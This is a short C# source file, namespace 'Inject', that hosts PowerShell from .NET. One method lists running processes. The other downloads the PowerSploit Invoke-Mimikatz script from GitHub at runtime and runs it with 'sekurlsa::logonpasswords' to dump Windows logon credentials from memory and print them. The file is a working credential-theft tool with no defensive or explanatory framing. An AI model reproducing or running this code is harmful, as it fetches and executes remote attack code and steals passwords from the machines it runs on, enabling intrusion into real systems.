using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;

namespace Inject
{
    public static class InjectPowershell
    {

        public static void executaPowershellLocal()
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript("Get-Process");
                var results = ps.Invoke();

                foreach (var result in results)
                {
                    var processo = (Process)result.BaseObject;
                    Console.WriteLine(string.Format("pid: {0, 10} \t {1} ", processo.Id, processo.ProcessName));
                }
            }

            runspace.Close();
        }

        public static void obtemLogonPasswords()
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            using (PowerShell powerShell = PowerShell.Create())
            {
                powerShell.Runspace = runspace;
                string script = new WebClient().DownloadString("https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
                powerShell.AddScript(script).AddScript("Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'");
                foreach (PSObject psobject in powerShell.Invoke())
                {
                    Console.WriteLine(psobject.BaseObject);
                }
            }
            runspace.Close();
        }
    }
}
